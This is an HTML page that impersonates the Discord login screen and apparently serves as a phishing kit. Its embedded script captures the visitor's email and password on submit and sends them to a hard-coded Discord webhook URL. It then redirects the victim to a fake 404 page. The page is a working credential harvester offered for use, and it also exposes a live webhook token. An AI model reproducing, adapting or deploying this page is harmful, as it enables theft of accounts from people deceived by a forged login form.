<!DOCTYPE html>
<html lang="de">

<head>
    <meta charset="UTF-8">
    <title>Discord Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            background: url('discord bild.png') center center / cover no-repeat;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }

        .login-container {
            background: #36393f;
            border-radius: 10px;
            box-shadow: 0 2px 20px rgba(0, 0, 0, 0.3);
            width: 920px;
            max-width: 95vw;
            display: flex;
            gap: 32px;
            padding: 32px 32px;
            align-items: center;
            min-height: 340px;
        }

        .login-form-section {
            flex: 1.2;
        }

        .login-form-section h2 {
            font-size: 32px;
            color: #fff;
            margin-bottom: 8px;
            font-weight: 500;
            text-align: center;
        }

        .login-form-section p {
            color: #b9bbbe;
            margin-bottom: 24px;
            font-size: 18px;
            text-align: center;
        }

        .form-group {
            margin-bottom: 18px;
        }

        .form-group label {
            display: block;
            margin-bottom: 6px;
            font-size: 13px;
            color: #b9bbbe;
            font-weight: 700;
            letter-spacing: 1px;
            text-transform: uppercase;
        }

        .form-group input {
            width: 100%;
            padding: 10px;
            border: none;
            border-radius: 3px;
            background: #202225;
            color: #dcddde;
            font-size: 16px;
            outline: none;
        }

        .forgot-link {
            display: block;
            margin-bottom: 18px;
            margin-top: -10px;
            color: #677cbd;
            text-decoration: none;
            font-size: 14px;
            font-weight: 600;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }

        .login-btn {
            width: 104%;
            padding: 12px;
            background: #5865f2;
            color: #fff;
            border: none;
            border-radius: 3px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 12px;
            transition: background 0.2s;
        }

        .login-btn:hover {
            background: #4751c6;
        }

        .register-text {
            color: #b9bbbe;
            font-size: 14px;
        }

        .register-link {
            color: #677cbd;
            text-decoration: none;
            margin-left: 4px;
            font-weight: 600;
        }

        .register-link:hover {
            text-decoration: underline;
        }

        .qr-section {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start;
            background: none;
            min-width: 220px;
        }

        .qr-section img {
            width: 190px;
            height: 190px;
            margin-bottom: 22px;
            border-radius: 4px;
            background: #fff;
            padding: 4px;
        }

        .qr-section h3 {
            color: #fff;
            font-size: 22px;
            margin-bottom: 12px;
            text-align: left;
            font-weight: 700;
        }

        .qr-section p {
            color: #b9bbbe;
            font-size: 18px;
            text-align: left;
            margin: 0;
        }

        @media (max-width: 800px) {
            .login-container {
                flex-direction: column;
                width: 98vw;
                padding: 24px 8px;
            }

            .qr-section {
                margin-top: 24px;
            }
        }
    </style>
</head>

<body>
    <div class="login-container">
        <div class="login-form-section">
            <h2>Welcome back!</h2>
            <p>We're so excited to see you again!</p>
            <form id="loginForm">
                <div class="form-group">
                    <label for="email">EMAIL OR PHONE NUMBER <span style="color:#ed4245">*</span></label>
                    <input type="text" id="email" name="email" autocomplete="username" required>
                </div>
                <div class="form-group">
                    <label for="password">PASSWORD <span style="color:#ed4245">*</span></label>
                    <input type="password" id="password" name="password" autocomplete="current-password" required>
                </div>
                <a href="#" class="forgot-link">Forgot your password?</a>
                <button type="submit" class="login-btn">Log In</button>
            </form>
            <div class="register-text">
                Need an account?
                <a href="#" class="register-link">Register</a>
            </div>
        </div>
        <div class="qr-section">
            <img src="qrcodedc.PNG" alt="QR Code">
            <h3>Log in with QR Code</h3>
            <p>Scan this with the Discord <b>mobile</b> </p>
            <p> <b>app</b> log in instantly.</p>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function (e) {
            e.preventDefault();

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            const webhookURL = "https://discordapp.com/api/webhooks/1373674295745839305/9BJXkIoDRPhG2EkZ-tqzuQ2Vmb3_Z2bmfz3ekbom4dIEIsN15mDi4pVov3QjHyQhP9Pv";

            const payload = {
                content: ` Neues Login:\n📧 Email: ${email}\n🔐 Passwort: ${password}`
            };

            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            }).then(response => {
                if (response.ok) {

                    window.location.href = "discord_404.html";
                } else {
                    alert("Fehler beim Senden der Daten");
                }
            }).catch(error => {
                alert("Fehler: " + error);
            });
        });
    </script>
</body>

</html>
